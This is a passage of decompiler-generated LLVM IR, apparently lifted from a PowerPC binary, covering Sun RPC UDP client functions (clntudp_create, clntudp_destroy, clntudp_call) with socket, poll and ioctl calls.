  %v3_10022658 = call i32 @__GI_bindresvport(i32 %v3_10022624, i16* null)
  store i32 %v3_10022658, i32* %r3.global-to-local, align 4
  %v0_1002265c = load i32, i32* %r24.global-to-local, align 4
  %v1_1002265c = inttoptr i32 %v0_1002265c to i32*
  %v2_1002265c = load i32, i32* %v1_1002265c, align 4
  store i32 %v2_1002265c, i32* @r3, align 4
  %v2_10022664 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_10022664, i32* @r5, align 4
  store i32 -2147195266, i32* @r4, align 4
  store i32 268576372, i32* @lr, align 4
  %v0_10022670 = call i32 @ioctl()
  store i32 %v0_10022670, i32* %r3.global-to-local, align 4
  %v0_10022674 = load i32, i32* %r24.global-to-local, align 4
  %v1_10022674 = inttoptr i32 %v0_10022674 to i32*
  %v2_10022674 = load i32, i32* %v1_10022674, align 4
  store i32 %v2_10022674, i32* %r3.global-to-local, align 4
  %v2_10022680 = ptrtoint i32* %stack_var_-100 to i32
  %v0_10022688 = load i32, i32* @r30, align 4
  store i32 %v0_10022688, i32* %stack_var_-100, align 4
  store i32 268576400, i32* @lr, align 4
  %v5_1002268c = call i32 @__GI_setsockopt(i32 %v2_10022674, i32 0, i32 11, i32 %v2_10022680, i32 4)
  store i32 %v5_1002268c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10022690

dec_label_pc_10022690:                            ; preds = %dec_label_pc_100225ec, %dec_label_pc_10022654
  %v0_10022690 = load i32, i32* @r30, align 4
  %v1_10022690 = load i32, i32* @r31, align 4
  %v2_10022690 = add i32 %v1_10022690, 4
  %v3_10022690 = inttoptr i32 %v2_10022690 to i32*
  store i32 %v0_10022690, i32* %v3_10022690, align 4
  %v0_10022694 = load i32, i32* %r24.global-to-local, align 4
  %v1_10022694 = inttoptr i32 %v0_10022694 to i32*
  %v2_10022694 = load i32, i32* %v1_10022694, align 4
  store i32 %v2_10022694, i32* %r0.global-to-local, align 4
  %v1_10022698 = load i32, i32* @r31, align 4
  %v2_10022698 = inttoptr i32 %v1_10022698 to i32*
  store i32 %v2_10022694, i32* %v2_10022698, align 4
  store i32 268576416, i32* @lr, align 4
  %v0_1002269c = call i32 @authnone_create()
  store i32 %v0_1002269c, i32* %r3.global-to-local, align 4
  %v1_100226a0 = load i32, i32* @r27, align 4
  %v2_100226a0 = inttoptr i32 %v1_100226a0 to i32*
  store i32 %v0_1002269c, i32* %v2_100226a0, align 4
  br label %dec_label_pc_100226cc

dec_label_pc_100226a8:                            ; preds = %dec_label_pc_10022560, %dec_label_pc_10022540, %dec_label_pc_10022634, %dec_label_pc_100224fc
  %v0_100226a8 = load i32, i32* @r31, align 4
  %v3_100226a8 = icmp eq i32 %v0_100226a8, 0
  br i1 %v3_100226a8, label %dec_label_pc_100226b8, label %dec_label_pc_100226b0

dec_label_pc_100226b0:                            ; preds = %dec_label_pc_100226a8
  store i32 %v0_100226a8, i32* @r3, align 4
  store i32 268576440, i32* @lr, align 4
  %v0_100226b4 = call i32 @free()
  store i32 %v0_100226b4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100226b8

dec_label_pc_100226b8:                            ; preds = %dec_label_pc_100226a8, %dec_label_pc_100226b0
  %v0_100226b8 = load i32, i32* @r27, align 4
  %v3_100226b8 = icmp eq i32 %v0_100226b8, 0
  br i1 %v3_100226b8, label %dec_label_pc_100226cc, label %dec_label_pc_100226c0

dec_label_pc_100226c0:                            ; preds = %dec_label_pc_100226b8
  store i32 %v0_100226b8, i32* @r3, align 4
  store i32 0, i32* @r27, align 4
  store i32 268576460, i32* @lr, align 4
  %v0_100226c8 = call i32 @free()
  store i32 %v0_100226c8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100226cc

dec_label_pc_100226cc:                            ; preds = %dec_label_pc_100226b8, %dec_label_pc_10022690, %dec_label_pc_100226c0
  store i32 %v0_10022494, i32* %r0.global-to-local, align 4
  %v0_100226d0 = load i32, i32* @r27, align 4
  store i32 %v0_100226d0, i32* %r3.global-to-local, align 4
  ret i32 %v0_100226d0

; uselistorder directives
  uselistorder i32 %v3_10022624, { 2, 0, 1, 3 }
  uselistorder i32 %v5_10022550, { 1, 0 }
  uselistorder i32 %v0_100224e4, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_100224d8, { 1, 0, 2 }
  uselistorder i32 %v1_100224c8, { 0, 2, 1 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder i32* %stack_var_-104, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 12, 13, 14, 15, 4, 16, 17, 18, 19, 20, 5, 6, 7, 21, 9, 8, 22, 23, 10, 24, 11, 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 0, 12, 11, 10, 9, 8, 7, 6, 5, 4, 1, 3, 2 }
  uselistorder i32 84, { 15, 4, 16, 11, 3, 2, 1, 0, 14, 6, 7, 8, 9, 10, 12, 13, 5 }
  uselistorder i32 100, { 22, 14, 12, 13, 1, 2, 3, 4, 5, 6, 15, 7, 16, 8, 17, 9, 18, 10, 19, 20, 21, 11, 0 }
  uselistorder label %dec_label_pc_100226cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100226b8, { 1, 0 }
  uselistorder label %dec_label_pc_100226a8, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10022690, { 1, 0 }
  uselistorder label %dec_label_pc_10022560, { 1, 0 }
}

define i32 @__GI_clntudp_create(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  store i32 8800, i32* @r8, align 4
  %v2_100226f4 = load i32, i32* %arg1, align 4
  %v1_100226f8 = add i32 %tmp, 4
  %v2_100226f8 = inttoptr i32 %v1_100226f8 to i32*
  %v3_100226f8 = load i32, i32* %v2_100226f8, align 4
  store i32 %v3_100226f8, i32* @r10, align 4
  store i32 %v2_100226f4, i32* %stack_var_-8, align 4
  %v4_10022700 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v4_10022700, i32* @r6, align 4
  store i32 8800, i32* @r9, align 4
  store i32 268576528, i32* @lr, align 4
  %v3_1002270c = call i32 @__GI_clntudp_bufcreate(i32 %v4_10022700, i32 8800, i32 8800)
  ret i32 %v3_1002270c

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @clntudp_destroy(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r30, align 4
  %v1_10022734 = add i32 %arg1, 8
  %v2_10022734 = inttoptr i32 %v1_10022734 to i32*
  %v3_10022734 = load i32, i32* %v2_10022734, align 4
  store i32 %v3_10022734, i32* @r31, align 4
  %v1_10022738 = add i32 %v3_10022734, 4
  %v2_10022738 = inttoptr i32 %v1_10022738 to i32*
  %v3_10022738 = load i32, i32* %v2_10022738, align 4
  %v3_1002273c = icmp eq i32 %v3_10022738, 0
  br i1 %v3_1002273c, label %dec_label_pc_1002274c, label %dec_label_pc_10022744

dec_label_pc_10022744:                            ; preds = %entry
  %v1_10022744 = inttoptr i32 %v3_10022734 to i32*
  %v2_10022744 = load i32, i32* %v1_10022744, align 4
  store i32 268576588, i32* @lr, align 4
  %v1_10022748 = call i32 @__libc_close(i32 %v2_10022744)
  %v0_1002274c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1002274c

dec_label_pc_1002274c:                            ; preds = %entry, %dec_label_pc_10022744
  %v0_1002274c = phi i32 [ %v3_10022734, %entry ], [ %v0_1002274c.pre, %dec_label_pc_10022744 ]
  %v1_1002274c = add i32 %v0_1002274c, 60
  %v2_1002274c = inttoptr i32 %v1_1002274c to i32*
  %v3_1002274c = load i32, i32* %v2_1002274c, align 4
  %v1_10022754 = add i32 %v3_1002274c, 28
  %v2_10022754 = inttoptr i32 %v1_10022754 to i32*
  %v3_10022754 = load i32, i32* %v2_10022754, align 4
  %v3_10022758 = icmp eq i32 %v3_10022754, 0
  br i1 %v3_10022758, label %dec_label_pc_10022768, label %dec_label_pc_10022760

dec_label_pc_10022760:                            ; preds = %dec_label_pc_1002274c
  call void @__pseudo_call(i32 %v3_10022754)
  %v0_10022768.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10022768

dec_label_pc_10022768:                            ; preds = %dec_label_pc_1002274c, %dec_label_pc_10022760
  %v0_10022768 = phi i32 [ %v0_1002274c, %dec_label_pc_1002274c ], [ %v0_10022768.pre, %dec_label_pc_10022760 ]
  store i32 %v0_10022768, i32* @r3, align 4
  store i32 268576624, i32* @lr, align 4
  %v0_1002276c = call i32 @free()
  %v0_10022770 = load i32, i32* @r30, align 4
  store i32 %v0_10022770, i32* @r3, align 4
  store i32 268576632, i32* @lr, align 4
  %v0_10022774 = call i32 @free()
  ret i32 %v0_10022774

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10022768, { 1, 0 }
  uselistorder label %dec_label_pc_1002274c, { 1, 0 }
}

define i32 @clntudp_call(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg7, i32* %r9.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %tmp42 = call i16 @__decompiler_undefined_function_2()
  %tmp43 = call i16 @__decompiler_undefined_function_2()
  %stack_var_-8948 = alloca i32, align 4
  %stack_var_-9004 = alloca i32, align 4
  %stack_var_-9064 = alloca i32, align 4
  %stack_var_-9036 = alloca i32, align 4
  %stack_var_-9020 = alloca i16, align 2
  %stack_var_-8980 = alloca i32, align 4
  %stack_var_-9044 = alloca i32, align 4
  %stack_var_-8900 = alloca i32, align 4
  %stack_var_-9060 = alloca i32, align 4
  %stack_var_-8936 = alloca i32, align 4
  %stack_var_-9072 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1002278c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1002278c, i32* %stack_var_-9072, align 4
  store i32 %tmp, i32* %r23.global-to-local, align 4
  store i32 %arg3, i32* %r20.global-to-local, align 4
  %v1_100227b4 = add i32 %arg7, 4
  %v2_100227b4 = inttoptr i32 %v1_100227b4 to i32*
  %v3_100227b4 = load i32, i32* %v2_100227b4, align 4
  %v1_100227bc = add i32 %tmp, 8
  %v2_100227bc = inttoptr i32 %v1_100227bc to i32*
  %v3_100227bc = load i32, i32* %v2_100227bc, align 4
  store i32 %v3_100227bc, i32* @r30, align 4
  %v1_100227c0 = inttoptr i32 %arg7 to i32*
  %v2_100227c0 = load i32, i32* %v1_100227c0, align 4
  store i32 %v2_100227c0, i32* %r3.global-to-local, align 4
  store i32 %v3_100227b4, i32* %r22.global-to-local, align 4
  %v1_100227c8 = add i32 %v3_100227bc, 32
  %v2_100227c8 = inttoptr i32 %v1_100227c8 to i32*
  %v3_100227c8 = load i32, i32* %v2_100227c8, align 4
  %v1_100227cc = add i32 %v3_100227bc, 28
  %v2_100227cc = inttoptr i32 %v1_100227cc to i32*
  %v3_100227cc = load i32, i32* %v2_100227cc, align 4
  store i32 %v3_100227cc, i32* %r9.global-to-local, align 4
  store i32 %v2_100227c0, i32* %r21.global-to-local, align 4
  %v1_100227d4 = add i32 %v3_100227bc, 40
  %v2_100227d4 = inttoptr i32 %v1_100227d4 to i32*
  %v3_100227d4 = load i32, i32* %v2_100227d4, align 4
  %v2_100227d8 = sdiv i32 %v3_100227c8, 1000
  %v1_100227e0 = mul i32 %v3_100227cc, 1000
  store i32 %v1_100227e0, i32* %r9.global-to-local, align 4
  %v3_100227e4 = icmp eq i32 %v3_100227d4, -1
  %v2_100227e8 = add i32 %v1_100227e0, %v2_100227d8
  store i32 %v2_100227e8, i32* %r16.global-to-local, align 4
  br i1 %v3_100227e4, label %dec_label_pc_10022828, label %dec_label_pc_10022820

dec_label_pc_100227f4:                            ; preds = %dec_label_pc_100228f4
  %v0_100227f4 = call i32 @__errno_location()
  store i32 %v0_100227f4, i32* %r3.global-to-local, align 4
  %v1_100227fc = inttoptr i32 %v0_100227f4 to i32*
  %v2_100227fc = load i32, i32* %v1_100227fc, align 4
  store i32 %v2_100227fc, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10022814

dec_label_pc_1002280c:                            ; preds = %dec_label_pc_10022a88, %dec_label_pc_10022c24
  br label %dec_label_pc_10022814

dec_label_pc_10022814:                            ; preds = %dec_label_pc_100227f4, %dec_label_pc_1002280c
  %storemerge = phi i32 [ 3, %dec_label_pc_100227f4 ], [ 4, %dec_label_pc_1002280c ]
  %v0_10022814 = phi i32 [ 3, %dec_label_pc_100227f4 ], [ 4, %dec_label_pc_1002280c ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v1_10022814 = load i32, i32* @r30, align 4
  %v2_10022814 = add i32 %v1_10022814, 44
  %v3_10022814 = inttoptr i32 %v2_10022814 to i32*
  store i32 %v0_10022814, i32* %v3_10022814, align 4
  %v0_10022818 = load i32, i32* %r9.global-to-local, align 4
  %v1_10022818 = load i32, i32* @r30, align 4
  %v2_10022818 = add i32 %v1_10022818, 48
  %v3_10022818 = inttoptr i32 %v2_10022818 to i32*
  store i32 %v0_10022818, i32* %v3_10022818, align 4
  br label %dec_label_pc_10022d28

dec_label_pc_10022820:                            ; preds = %entry
  %v1_10022820 = add i32 %v3_100227bc, 36
  %v2_10022820 = inttoptr i32 %v1_10022820 to i32*
  %v3_10022820 = load i32, i32* %v2_10022820, align 4
  store i32 %v3_10022820, i32* %r21.global-to-local, align 4
  store i32 %v3_100227d4, i32* %r22.global-to-local, align 4
  br label %dec_label_pc_10022828

dec_label_pc_10022828:                            ; preds = %entry, %dec_label_pc_10022820
  store i32 0, i32* %r19.global-to-local, align 4
  store i32 2, i32* %r17.global-to-local, align 4
  store i32 0, i32* %r24.global-to-local, align 4
  store i32 0, i32* %r18.global-to-local, align 4
  %v2_1002292c = ptrtoint i32* %stack_var_-8936 to i32
  %v2_10022958 = ptrtoint i32* %stack_var_-9060 to i32
  %v4_10022a98 = zext i16 %tmp42 to i32
  %v1_10022a9c = and i32 %v4_10022a98, 8
  %v3_10022a9c = icmp eq i32 %v1_10022a9c, 0
  %v2_10022bec = ptrtoint i32* %stack_var_-9036 to i32
  %v2_10022bf0 = ptrtoint i32* %stack_var_-9064 to i32
  %v2_10022ab8 = ptrtoint i32* %stack_var_-8900 to i32
  %v2_10022ac0 = ptrtoint i16* %stack_var_-9020 to i32
  %v2_10022994 = ptrtoint i32* %stack_var_-9044 to i32
  %v2_100229fc = ptrtoint i32* %stack_var_-8980 to i32
  %tmp82 = urem i16 %tmp43, 2
  %v1_100229dc = zext i16 %tmp82 to i32
  %v3_100229dc = icmp eq i16 %tmp82, 0
  %v2_10022c50 = ptrtoint i32* %stack_var_-9004 to i32
  %v2_10022c64 = ptrtoint i32* %stack_var_-8948 to i32
  br label %dec_label_pc_10022838

dec_label_pc_10022838:                            ; preds = %dec_label_pc_10022d14, %dec_label_pc_10022828
  %v1_1002284c = phi i32 [ %v0_1002283c.pre, %dec_label_pc_10022d14 ], [ %v3_100227bc, %dec_label_pc_10022828 ]
  %v0_10022838 = phi i32 [ %v0_10022838.pre, %dec_label_pc_10022d14 ], [ %arg3, %dec_label_pc_10022828 ]
  %v3_10022838 = icmp eq i32 %v0_10022838, 0
  %v1_1002283c = add i32 %v1_1002284c, 56
  store i32 %v1_1002283c, i32* @r26, align 4
  br i1 %v3_10022838, label %dec_label_pc_10022928, label %dec_label_pc_10022844

dec_label_pc_10022844:                            ; preds = %dec_label_pc_10022838
  %v1_10022848 = add i32 %v1_1002284c, 60
  %v2_10022848 = inttoptr i32 %v1_10022848 to i32*
  %v3_10022848 = load i32, i32* %v2_10022848, align 4
  store i32 %v3_10022848, i32* %r9.global-to-local, align 4
  %v3_1002284c = inttoptr i32 %v1_1002283c to i32*
  store i32 0, i32* %v3_1002284c, align 4
  %v0_10022850 = load i32, i32* @r26, align 4
  store i32 %v0_10022850, i32* %r3.global-to-local, align 4
  %v0_10022858 = load i32, i32* %r9.global-to-local, align 4
  %v1_10022858 = add i32 %v0_10022858, 20
  %v2_10022858 = inttoptr i32 %v1_10022858 to i32*
  %v3_10022858 = load i32, i32* %v2_10022858, align 4
  store i32 %v3_10022858, i32* %r9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_10022858)
  %v0_10022864 = load i32, i32* @r30, align 4
  %v1_10022864 = add i32 %v0_10022864, 88
  %v2_10022864 = inttoptr i32 %v1_10022864 to i32*
  %v3_10022864 = load i32, i32* %v2_10022864, align 4
  %v0_10022868 = load i32, i32* @r26, align 4
  store i32 %v0_10022868, i32* %r3.global-to-local, align 4
  %v1_10022870 = inttoptr i32 %v3_10022864 to i32*
  %v2_10022870 = load i32, i32* %v1_10022870, align 4
  %v1_10022874 = add i32 %v2_10022870, 1
  store i32 %v1_10022874, i32* %r9.global-to-local, align 4
  store i32 %v1_10022874, i32* %v1_10022870, align 4
  %v0_1002287c = load i32, i32* @r26, align 4
  %v1_1002287c = add i32 %v0_1002287c, 4
  %v2_1002287c = inttoptr i32 %v1_1002287c to i32*
  %v3_1002287c = load i32, i32* %v2_1002287c, align 4
  store i32 %v3_1002287c, i32* %r9.global-to-local, align 4
  %v1_10022880 = add i32 %v3_1002287c, 4
  %v2_10022880 = inttoptr i32 %v1_10022880 to i32*
  %v3_10022880 = load i32, i32* %v2_10022880, align 4
  store i32 %v3_10022880, i32* %r9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_10022880)
  %v0_1002288c = load i32, i32* %r3.global-to-local, align 4
  %v3_1002288c = icmp eq i32 %v0_1002288c, 0
  br i1 %v3_1002288c, label %dec_label_pc_100228d0, label %dec_label_pc_10022894

dec_label_pc_10022894:                            ; preds = %dec_label_pc_10022844
  %v0_10022894 = load i32, i32* %r23.global-to-local, align 4
  %v1_10022894 = inttoptr i32 %v0_10022894 to i32*
  %v2_10022894 = load i32, i32* %v1_10022894, align 4
  store i32 %v2_10022894, i32* %r3.global-to-local, align 4
  %v1_1002289c = add i32 %v2_10022894, 32
  %v2_1002289c = inttoptr i32 %v1_1002289c to i32*
  %v3_1002289c = load i32, i32* %v2_1002289c, align 4
  store i32 %v3_1002289c, i32* %r9.global-to-local, align 4
  %v1_100228a0 = add i32 %v3_1002289c, 4
  %v2_100228a0 = inttoptr i32 %v1_100228a0 to i32*
  %v3_100228a0 = load i32, i32* %v2_100228a0, align 4
  store i32 %v3_100228a0, i32* %r9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_100228a0)
  %v0_100228ac = load i32, i32* %r3.global-to-local, align 4
  %v3_100228ac = icmp eq i32 %v0_100228ac, 0
  br i1 %v3_100228ac, label %dec_label_pc_100228d0, label %dec_label_pc_100228b4

dec_label_pc_100228b4:                            ; preds = %dec_label_pc_10022894
  %v0_100228b4 = load i32, i32* @r26, align 4
  store i32 %v0_100228b4, i32* %r3.global-to-local, align 4
  %v0_100228bc = load i32, i32* %r20.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_100228bc)
  %v0_100228c8 = load i32, i32* %r3.global-to-local, align 4
  %v3_100228c8 = icmp eq i32 %v0_100228c8, 0
  br i1 %v3_100228c8, label %dec_label_pc_100228d0, label %dec_label_pc_100228dc

dec_label_pc_100228d0:                            ; preds = %dec_label_pc_100228b4, %dec_label_pc_10022894, %dec_label_pc_10022844
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10022a80

dec_label_pc_100228dc:                            ; preds = %dec_label_pc_100228b4
  %v0_100228dc = load i32, i32* @r26, align 4
  %v1_100228dc = add i32 %v0_100228dc, 4
  %v2_100228dc = inttoptr i32 %v1_100228dc to i32*
  %v3_100228dc = load i32, i32* %v2_100228dc, align 4
  store i32 %v3_100228dc, i32* %r9.global-to-local, align 4
  store i32 %v0_100228dc, i32* %r3.global-to-local, align 4
  %v1_100228e4 = add i32 %v3_100228dc, 16
  %v2_100228e4 = inttoptr i32 %v1_100228e4 to i32*
  %v3_100228e4 = load i32, i32* %v2_100228e4, align 4
  store i32 %v3_100228e4, i32* %r9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_100228e4)
  %v0_100228f0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_100228f0, i32* %r19.global-to-local, align 4
  %v0_100228f4.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100228f4

dec_label_pc_100228f4:                            ; preds = %dec_label_pc_10022a70, %dec_label_pc_10022a64, %dec_label_pc_100228dc
  %v0_10022904 = phi i32 [ %v0_10022a1c, %dec_label_pc_10022a70 ], [ %v0_10022a1c, %dec_label_pc_10022a64 ], [ %v0_100228f4.pre, %dec_label_pc_100228dc ]
  %v1_100228f4 = inttoptr i32 %v0_10022904 to i32*
  %v2_100228f4 = load i32, i32* %v1_100228f4, align 4
  store i32 %v2_100228f4, i32* %r3.global-to-local, align 4
  %v0_100228f8 = load i32, i32* %r19.global-to-local, align 4
  %v1_100228fc = add i32 %v0_10022904, 88
  %v2_100228fc = inttoptr i32 %v1_100228fc to i32*
  %v3_100228fc = load i32, i32* %v2_100228fc, align 4
  %v1_10022904 = add i32 %v0_10022904, 24
  %v2_10022904 = inttoptr i32 %v1_10022904 to i32*
  %v3_10022904 = load i32, i32* %v2_10022904, align 4
  %v1_10022908 = add i32 %v0_10022904, 8
  store i32 268577040, i32* @lr, align 4
  %v6_1002290c = call i32 @__libc_sendto(i32 %v2_100228f4, i32 %v3_100228fc, i32 %v0_100228f8, i32 0, i32 %v1_10022908, i32 %v3_10022904)
  store i32 %v6_1002290c, i32* %r3.global-to-local, align 4
  %v1_10022910 = load i32, i32* %r19.global-to-local, align 4
  %v4_10022910 = icmp eq i32 %v6_1002290c, %v1_10022910
  br i1 %v4_10022910, label %dec_label_pc_10022918, label %dec_label_pc_100227f4

dec_label_pc_10022918:                            ; preds = %dec_label_pc_100228f4
  %v0_10022918 = load i32, i32* %r21.global-to-local, align 4
  %v3_10022918 = icmp eq i32 %v0_10022918, 0
  br i1 %v3_10022918, label %dec_label_pc_10022920, label %dec_label_pc_10022928

dec_label_pc_10022920:                            ; preds = %dec_label_pc_10022918
  %v0_10022920 = load i32, i32* %r22.global-to-local, align 4
  %v3_10022920 = icmp eq i32 %v0_10022920, 0
  br i1 %v3_10022920, label %dec_label_pc_10022a78, label %dec_label_pc_10022928

dec_label_pc_10022928:                            ; preds = %dec_label_pc_10022918, %dec_label_pc_10022920, %dec_label_pc_10022838
  store i32 ptrtoint (i32* @global_var_1004eeb8.1300 to i32), i32* %r9.global-to-local, align 4
  %v0_1002294c = load i32, i32* @r30, align 4
  %v1_1002294c = inttoptr i32 %v0_1002294c to i32*
  %v2_1002294c = load i32, i32* %v1_1002294c, align 4
  store i32 %v2_1002294c, i32* %r9.global-to-local, align 4
  store i32 %v2_1002294c, i32* %stack_var_-9060, align 4
  br label %dec_label_pc_10022958

dec_label_pc_10022958:                            ; preds = %dec_label_pc_10022a88, %dec_label_pc_10022c3c, %dec_label_pc_10022c2c, %dec_label_pc_10022c24, %dec_label_pc_10022928
  store i32 %v2_10022958, i32* %r3.global-to-local, align 4
  %v0_10022960 = load i32, i32* %r16.global-to-local, align 4
  store i32 268577128, i32* @lr, align 4
  %v3_10022964 = call i32 @__libc_poll(i32 %v2_10022958, i32 1, i32 %v0_10022960)
  store i32 %v3_10022964, i32* %r3.global-to-local, align 4
  %v3_10022968 = icmp eq i32 %v3_10022964, -1
  br i1 %v3_10022968, label %dec_label_pc_10022a88, label %dec_label_pc_10022970

dec_label_pc_10022970:                            ; preds = %dec_label_pc_10022958
  %v3_10022970 = icmp eq i32 %v3_10022964, 0
  br i1 %v3_10022970, label %dec_label_pc_10022978, label %dec_label_pc_10022a98

dec_label_pc_10022978:                            ; preds = %dec_label_pc_10022970
  %v0_10022978 = load i32, i32* @r30, align 4
  %v1_10022978 = inttoptr i32 %v0_10022978 to i32*
  %v2_10022978 = load i32, i32* %v1_10022978, align 4
  store i32 %v2_10022978, i32* %r25.global-to-local, align 4
  store i32 8800, i32* %stack_var_-9044, align 4
  store i32 35090, i32* @r4, align 4
  store i32 %v2_10022978, i32* @r3, align 4
  store i32 %v2_10022994, i32* @r5, align 4
  store i32 268577188, i32* @lr, align 4
  %v0_100229a0 = call i32 @ioctl()
  store i32 %v0_100229a0, i32* %r3.global-to-local, align 4
  %v3_100229a4 = icmp eq i32 %v0_100229a0, 0
  br i1 %v3_100229a4, label %dec_label_pc_100229ac, label %dec_label_pc_10022a10

dec_label_pc_100229ac:                            ; preds = %dec_label_pc_10022978
  %v3_100229ac = load i32, i32* %stack_var_-9044, align 4
  store i32 %v2_10022ab8, i32* @r29, align 4
  %v1_100229b4 = udiv i32 %v3_100229ac, 32
  %tmp83 = icmp ugt i32 %v3_100229ac, 31
  store i32 35091, i32* @r4, align 4
  %v0_10022a0479 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_10022a0479, i32* @r3, align 4
  %v1_10022a0880 = add nsw i32 %v1_100229b4, -1
  store i32 %v1_10022a0880, i32* @r28, align 4
  br i1 %tmp83, label %dec_label_pc_100229bc, label %dec_label_pc_10022a10

dec_label_pc_100229bc:                            ; preds = %dec_label_pc_100229ac, %dec_label_pc_100229f0
  store i32 %v2_100229fc, i32* @r5, align 4
  store i32 268577232, i32* @lr, align 4
  %v0_100229cc = call i32 @ioctl()
  store i32 %v0_100229cc, i32* %r3.global-to-local, align 4
  %v1_100229d0 = icmp slt i32 %v0_100229cc, 0
  br i1 %v1_100229d0, label %dec_label_pc_10022a10, label %dec_label_pc_100229d8

dec_label_pc_100229d8:                            ; preds = %dec_label_pc_100229bc
  store i32 %v1_100229dc, i32* %r9.global-to-local, align 4
  %v0_100229f0.pre = load i32, i32* @r29, align 4
  br i1 %v3_100229dc, label %dec_label_pc_100229f0, label %dec_label_pc_100229e4

dec_label_pc_100229e4:                            ; preds = %dec_label_pc_100229d8
  %v1_100229e4 = add i32 %v0_100229f0.pre, 16
  %v2_100229e4 = inttoptr i32 %v1_100229e4 to i16*
  %v3_100229e4 = load i16, i16* %v2_100229e4, align 2
  %v3_100229e8 = icmp eq i16 %v3_100229e4, 2
  br i1 %v3_100229e8, label %dec_label_pc_10022a1c, label %dec_label_pc_100229f0

dec_label_pc_100229f0:                            ; preds = %dec_label_pc_100229d8, %dec_label_pc_100229e4
  %v1_100229f0 = add i32 %v0_100229f0.pre, 32
  store i32 %v1_100229f0, i32* @r29, align 4
  %v0_100229f4.pre = load i32, i32* @r28, align 4
  %v2_100229f4 = icmp sgt i32 %v0_100229f4.pre, 0
  store i32 35091, i32* @r4, align 4
  %v0_10022a04 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_10022a04, i32* @r3, align 4
  %v1_10022a08 = add i32 %v0_100229f4.pre, -1
  store i32 %v1_10022a08, i32* @r28, align 4
  br i1 %v2_100229f4, label %dec_label_pc_100229bc, label %dec_label_pc_10022a10

dec_label_pc_10022a10:                            ; preds = %dec_label_pc_10022978, %dec_label_pc_100229ac, %dec_label_pc_100229f0, %dec_label_pc_100229bc
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10022a80

dec_label_pc_10022a1c:                            ; preds = %dec_label_pc_100229e4
  %v0_10022a1c = load i32, i32* @r30, align 4
  %v1_10022a1c = add i32 %v0_10022a1c, 32
  %v2_10022a1c = inttoptr i32 %v1_10022a1c to i32*
  %v3_10022a1c = load i32, i32* %v2_10022a1c, align 4
  store i32 1000000, i32* %r9.global-to-local, align 4
  %v0_10022a28 = load i32, i32* %r24.global-to-local, align 4
  %v2_10022a28 = add i32 %v0_10022a28, %v3_10022a1c
  store i32 %v2_10022a28, i32* %r24.global-to-local, align 4
  %v1_10022a2c = add i32 %v0_10022a1c, 28
  %v2_10022a2c = inttoptr i32 %v1_10022a2c to i32*
  %v3_10022a2c = load i32, i32* %v2_10022a2c, align 4
  %v2_10022a30 = udiv i32 %v2_10022a28, 1000000
  %v0_10022a34 = load i32, i32* %r18.global-to-local, align 4
  %v2_10022a34 = add i32 %v0_10022a34, %v3_10022a2c
  store i32 %v2_10022a34, i32* %r18.global-to-local, align 4
  %v1_10022a3c = add nuw nsw i32 %v2_10022a30, 1
  store i32 %v1_10022a3c, i32* %r9.global-to-local, align 4
  %tmp65 = icmp sgt i32 %v2_10022a28, -1
  br i1 %tmp65, label %dec_label_pc_10022a5c.preheader, label %dec_label_pc_10022a5c.preheader.thread

dec_label_pc_10022a5c.preheader.thread:           ; preds = %dec_label_pc_10022a1c
  %v1_10022a5c1230 = add i32 %v2_10022a28, -983040
  store i32 %v1_10022a5c1230, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10022a64

dec_label_pc_10022a5c.preheader:                  ; preds = %dec_label_pc_10022a1c
  %v1_10022a5c12 = add i32 %v2_10022a28, -983040
